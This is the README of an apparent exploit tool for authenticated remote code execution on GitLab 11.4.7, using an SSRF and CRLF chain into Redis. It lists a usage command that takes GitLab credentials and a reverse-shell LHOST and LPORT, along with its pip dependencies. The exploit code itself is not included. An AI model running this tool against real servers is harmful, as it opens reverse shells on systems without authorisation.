# GitLab-11.4.7-Authenticated-Remote-Code-Execution        
# (SSRF + CRLF -> Redis -> RCE)

<h4> Blog : https://github.com/jas502n/gitlab-SSRF-redis-RCE/blob/master/README.md </h4>


<h3> Usage : python gitlab_rce.py -U `USERNAME` -P `PASSWORD` -l `LHOST` -p `LPORT` </h3>
  

usage: gitlab_rce.py [-h] [-U U] [-P P] [-l L] [-p P]

GitLab 11.4.7 Authenticated RCE

<p>optional arguments:</p>

 <p> -h, --help show this help message and exit </p>
 <p> -U         GitLab Username </p>
 <p> -P         Gitlab Password </p>
 <p> -l         rev shell lhost </p>
 <p> -p         rev shell lport </p> 


# Dependencies

<h4> pip install RandomWords==0.1.5 </h4>
<h4> pip install bs4 </h4>
<h4> pip install requests </h4>
